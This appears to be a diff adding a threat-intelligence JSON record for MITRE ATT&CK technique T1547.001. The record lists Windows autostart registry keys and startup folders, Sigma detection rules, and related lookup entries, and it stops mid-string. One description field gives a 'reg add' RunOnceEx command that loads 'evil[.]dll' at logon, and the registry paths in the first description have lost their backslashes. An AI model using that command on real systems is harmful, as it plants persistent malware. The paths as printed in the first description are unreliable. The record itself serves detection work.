@@ -1,0 +1,926 @@
+{
+    "id": "T1547.001",
+    "name": "Registry Run Keys / Startup Folder",
+    "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is `C:Users\\[Username]AppDataRoamingMicrosoftWindowsStart MenuProgramsStartup`. The startup folder path for all users is `C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp`.\nThe following run keys are created by default on Windows systems:\n* `HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun`\n* `HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRunOnce`\n* `HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun`\n* `HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunOnce`\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The `HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunOnceEx` is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: `reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionRunOnceEx0001Depend /v 1 /d \"C:tempevil[.]dll\"` (Citation: Oddvar Moe RunOnceEx Mar 2018)\nThe following Registry keys can be used to set startup folder items for persistence:\n* `HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionExplorerUser Shell Folders`\n* `HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionExplorerShell Folders`\n* `HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionExplorerShell Folders`\n* `HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionExplorerUser Shell Folders`\nThe following Registry keys can control automatic startup of services during boot:\n* `HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunServicesOnce`\n* `HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRunServicesOnce`\n* `HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunServices`\n* `HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRunServices`\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* `HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun`\n* `HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun`\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The `HKEY_LOCAL_MACHINESoftwareMicrosoftWindows NTCurrentVersionWinlogonUserinit` and `HKEY_LOCAL_MACHINESoftwareMicrosoftWindows NTCurrentVersionWinlogonShell` subkeys can automatically launch programs.\nPrograms listed in the load value of the registry key `HKEY_CURRENT_USERSoftwareMicrosoftWindows NTCurrentVersionWindows` run when any user logs on.\nBy default, the multistring `BootExecute` value of the registry key `HKEY_LOCAL_MACHINESystemCurrentControlSetControlSession Manager` is set to `autocheck autochk *`. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](T1036) to make the Registry entries look as if they are associated with legitimate programs.",
+    "platforms": "Windows",
+    "kill_chain_phases": "Persistence, Privilege Escalation",
+    "data_sources": "Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification, File: File Modification, Command: Command Execution, Process: Process Creation",
+    "detection": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
+    "url": "https://attack.mitre.org/techniques/T1547/001",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1547.001",
+                "atomic_attack_guid": "6e1666d5-3f2b-4b9a-80aa-f011322380d4",
+                "atomic_attack_name": "Creating Boot Verification Program Key for application execution during successful boot",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Persistence Attempt Via Existing Service Tampering",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sc_service_tamper_for_persistence.yml",
+                        "remote_content": "title: Potential Persistence Attempt Via Existing Service Tampering\nid: 38879043-7e1e-47a9-8d46-6bec88e201df\nstatus: test\ndescription: Detects the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence.\nreferences:\n    - https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/\nauthor: Sreeman\ndate: 2020-09-29\nmodified: 2023-02-04\ntags:\n    - attack.persistence\n    - attack.t1543.003\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - CommandLine|contains|all:\n              - 'sc '\n              - 'config '\n              - 'binpath='\n        - CommandLine|contains|all:\n              - 'sc '\n              - 'failure'\n              - 'command='\n    selection_reg_img:\n        - CommandLine|contains|all:\n              - 'reg '\n              - 'add '\n              - 'FailureCommand'\n        - CommandLine|contains|all:\n              - 'reg '\n              - 'add '\n              - 'ImagePath'\n    selection_reg_ext:\n        CommandLine|contains:\n            - '.sh'\n            - '.exe'\n            - '.dll'\n            - '.bin$'\n            - '.bat'\n            - '.cmd'\n            - '.js'\n            - '.msh$'\n            - '.reg$'\n            - '.scr'\n            - '.ps'\n            - '.vb'\n            - '.jar'\n            - '.pl'\n    condition: selection_sc or all of selection_reg_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1547.001",
+                "atomic_attack_guid": "554cbd88-cde1-4b56-8168-0be552eed9eb",
+                "atomic_attack_name": "Reg Key RunOnce",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Direct Autorun Keys Modification",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_direct_asep_registry_keys_modification.yml",
+                        "remote_content": "title: Direct Autorun Keys Modification\nid: 24357373-078f-44ed-9ac4-6d334a668a11\nstatus: test\ndescription: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\nauthor: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-25\nmodified: 2022-08-04\ntags:\n    - attack.persistence\n    - attack.t1547.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains: 'add'     # to avoid intersection with discovery tactic rules\n    selection_2:\n        CommandLine|contains:           # need to improve this list, there are plenty of ASEP reg keys\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Run' # Also covers the strings \"RunOnce\", \"RunOnceEx\", \"RunServices\", \"RunServicesOnce\"\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n            - '\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml",
+                        "remote_content": "title: Potential Persistence Attempt Via Run Keys Using Reg.EXE\nid: de587dce-915e-4218-aac4-835ca6af6f70\nstatus: test\ndescription: Detects suspicious command line reg.exe tool adding key to RUN key in Registry\nreferences:\n    - https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/\n    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-28\nmodified: 2023-01-30\ntags:\n    - attack.persistence\n    - attack.t1547.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg'\n            - ' ADD '\n            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1547.001",
+                "atomic_attack_guid": "e55be3fd-3521-4610-9d1a-e210e42dcf05",
+                "atomic_attack_name": "Reg Key Run",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Direct Autorun Keys Modification",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_direct_asep_registry_keys_modification.yml",
+                        "remote_content": "title: Direct Autorun Keys Modification\nid: 24357373-078f-44ed-9ac4-6d334a668a11\nstatus: test\ndescription: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\nauthor: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-25\nmodified: 2022-08-04\ntags:\n    - attack.persistence\n    - attack.t1547.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains: 'add'     # to avoid intersection with discovery tactic rules\n    selection_2:\n        CommandLine|contains:           # need to improve this list, there are plenty of ASEP reg keys\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Run' # Also covers the strings \"RunOnce\", \"RunOnceEx\", \"RunServices\", \"RunServicesOnce\"\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n            - '\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml",
+                        "remote_content": "title: Potential Persistence Attempt Via Run Keys Using Reg.EXE\nid: de587dce-915e-4218-aac4-835ca6af6f70\nstatus: test\ndescription: Detects suspicious command line reg.exe tool adding key to RUN key in Registry\nreferences:\n    - https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/\n    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-28\nmodified: 2023-01-30\ntags:\n    - attack.persistence\n    - attack.t1547.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg'\n            - ' ADD '\n            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "9df5f547-c86a-433e-b533-f2794357e242",
+                    "9c5037d1-c568-49b3-88c7-9846a5bdc2be",
+                    "18f2065c-d36c-464a-a748-bcf909acb2e3",
+                    "9efb1ea7-c37b-4595-9640-b7680cd84279",
+                    "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                    "170901d1-de11-4de7-bccb-8fa13678d857",
+                    "f59c3faf-50f3-464b-9f4c-1b67ab512d99",
+                    "b7916c2a-fa2f-4795-9477-32b731f70f11",
+                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                    "de587dce-915e-4218-aac4-835ca6af6f70",
+                    "17f878b8-9968-4578-b814-c4217fc5768c",
+                    "24357373-078f-44ed-9ac4-6d334a668a11",
+                    "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd",
+                    "9c226817-8dc9-46c2-a58d-66655aafd7dc",
+                    "827e941e-4a99-4e2c-a578-bfcec2d40552",
+                    "20c3f09d-c53d-4e85-8b74-6aa50e2f1b61",
+                    "70d43542-cd2d-483c-8f30-f16b436fd7db",
+                    "02ee49e2-e294-4d0f-9278-f5b3212fc588",
+                    "46490193-1b22-4c29-bdd6-5bf63907216f",
+                    "a80f662f-022f-4429-9b8c-b1a41aaa6688",
+                    "b29aed60-ebd1-442b-9cb5-16a1d0324adb",
+                    "480421f9-417f-4d3b-9552-fd2728443ec8",
+                    "92fa78e7-4d39-45f1-91a3-8b23f3f1088d",
+                    "2aa0a6b4-a865-495b-ab51-c28249537b75",
+                    "046218bd-e0d8-4113-a3c3-895a12b2b298",
+                    "d8c0c469-2d3e-437a-80a1-a38bfe5998e8",
+                    "e7a2fd40-3ae1-4a85-bf80-15cf624fb1b1",
+                    "d6c2ce7e-afb5-4337-9ca4-4b5254ed0565",
+                    "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
+                    "8d85cf08-bf97-4260-ba49-986a2a65129c",
+                    "cbf93e5d-ca6c-4722-8bea-e9119007c248",
+                    "28208707-fe31-437f-9a7f-4b1108b94d2e",
+                    "7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74",
+                    "baecf8fb-edbf-429f-9ade-31fc3f22b970",
+                    "318557a5-150c-4c8d-b70e-a9910e199857",
+                    "c37510b8-2107-4b78-aa32-72f251e7a844",
+                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                    "f674e36a-4b91-431e-8aef-f8a96c2aca35",
+                    "f663a6d9-9d1b-49b8-b2b1-0637914d199a"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "9df5f547-c86a-433e-b533-f2794357e242",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_drivers:\n    Image: C:\\Windows\\System32\\drvinst.exe\n  filter_empty:\n    Details: (Empty)\n  filter_msoffice:\n    Details: '{807583E5-5146-11D5-A672-00B0D022E945}'\n  filter_svchost:\n    Image: C:\\Windows\\System32\\svchost.exe\n    TargetObject|contains: \\lnkfile\\shellex\\ContextMenuHandlers\\\n  selection_classes_base:\n    EventType: SetValue\n    TargetObject|contains: \\Software\\Classes\n  selection_classes_target:\n    TargetObject|contains:\n    - \\Folder\\ShellEx\\ExtShellFolderViews\n    - \\Folder\\ShellEx\\DragDropHandlers\n    - \\Folder\\Shellex\\ColumnHandlers\n    - \\Filter\n    - \\Exefile\\Shell\\Open\\Command\\(Default)\n    - \\Directory\\Shellex\\DragDropHandlers\n    - \\Directory\\Shellex\\CopyHookHandlers\n    - \\CLSID\\{AC757296-3522-4E11-9862-C17BE5A1767E}\\Instance\n    - \\CLSID\\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\\Instance\n    - \\CLSID\\{7ED96837-96F0-4812-B211-F13C24117ED3}\\Instance\n    - \\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\Instance\n    - \\Classes\\AllFileSystemObjects\\ShellEx\\DragDropHandlers\n    - \\.exe\n    - \\.cmd\n    - \\ShellEx\\PropertySheetHandlers\n    - \\ShellEx\\ContextMenuHandlers\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: 9df5f547-c86a-433e-b533-f2794357e242\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/18\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Classes Autorun Keys Modification\n",
+                            "sigma:id": "9df5f547-c86a-433e-b533-f2794357e242",
+                            "title": "Classes Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9c5037d1-c568-49b3-88c7-9846a5bdc2be",
+                        "lookup_data": {
+                            "description": "Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/10/01\ndescription: Detects the suspicious RUN keys created by software located in Download\n  or temporary Outlook/Internet Explorer directories\ndetection:\n  condition: selection\n  selection:\n    Image|contains:\n    - \\Downloads\\\n    - \\Temporary Internet Files\\Content.Outlook\\\n    - \\Local Settings\\Temporary Internet Files\\\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\nfalsepositives:\n- Software installers downloaded and used by users\nid: 9c5037d1-c568-49b3-88c7-9846a5bdc2be\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Suspicious Run Key from Download\n",
+                            "sigma:id": "9c5037d1-c568-49b3-88c7-9846a5bdc2be",
+                            "title": "Suspicious Run Key from Download",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "18f2065c-d36c-464a-a748-bcf909acb2e3",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: wow_classes_base and wow_classes and not filter\n  filter:\n    Details: (Empty)\n  wow_classes:\n    TargetObject|contains:\n    - \\Folder\\ShellEx\\ExtShellFolderViews\n    - \\Folder\\ShellEx\\DragDropHandlers\n    - \\Folder\\ShellEx\\ColumnHandlers\n    - \\Directory\\Shellex\\DragDropHandlers\n    - \\Directory\\Shellex\\CopyHookHandlers\n    - \\CLSID\\{AC757296-3522-4E11-9862-C17BE5A1767E}\\Instance\n    - \\CLSID\\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\\Instance\n    - \\CLSID\\{7ED96837-96F0-4812-B211-F13C24117ED3}\\Instance\n    - \\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\Instance\n    - \\AllFileSystemObjects\\ShellEx\\DragDropHandlers\n    - \\ShellEx\\PropertySheetHandlers\n    - \\ShellEx\\ContextMenuHandlers\n  wow_classes_base:\n    EventType: SetValue\n    TargetObject|contains: \\Software\\Wow6432Node\\Classes\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: 18f2065c-d36c-464a-a748-bcf909acb2e3\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Wow6432Node Classes Autorun Keys Modification\n",
+                            "sigma:id": "18f2065c-d36c-464a-a748-bcf909acb2e3",
+                            "title": "Wow6432Node Classes Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9efb1ea7-c37b-4595-9640-b7680cd84279",
+                        "lookup_data": {
+                            "capec": "CAPEC-270",
+                            "mitre-attack-id": "T1547.001",
+                            "mitre-cti:description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
+                            "mitre-cti:name": "Registry Run Keys / Startup Folder",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Oddvar Moe, @oddvarmoe', 'Dray Agha, @Purp1eW0lf, Huntress Labs'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279', 'created': '2020-01-23T22:02:48.566Z', 'x_mitre_version': '1.2', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001'}, {'source_name': 'Malwarebytes Wow6432Node 2016', 'url': 'https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/', 'description': 'Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.'}, {'source_name': 'Microsoft Wow6432Node 2018', 'url': 'https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry', 'description': 'Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.'}, {'source_name': 'Microsoft Run Key', 'url': 'http://msdn.microsoft.com/en-us/library/aa376977', 'description': 'Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.'}, {'source_name': 'Oddvar Moe RunOnceEx Mar 2018', 'url': 'https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/', 'description': 'Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.'}, {'source_name': 'TechNet Autoruns', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.'}, {'url': 'https://capec.mitre.org/data/definitions/270.html', 'source_name': 'capec', 'external_id': 'CAPEC-270'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account\\'s associated permissions level.\\n\\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\\\Users\\\\\\\\[Username]\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup</code>. The startup folder path for all users is <code>C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp</code>.\\n\\nThe following run keys are created by default on Windows systems:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n* 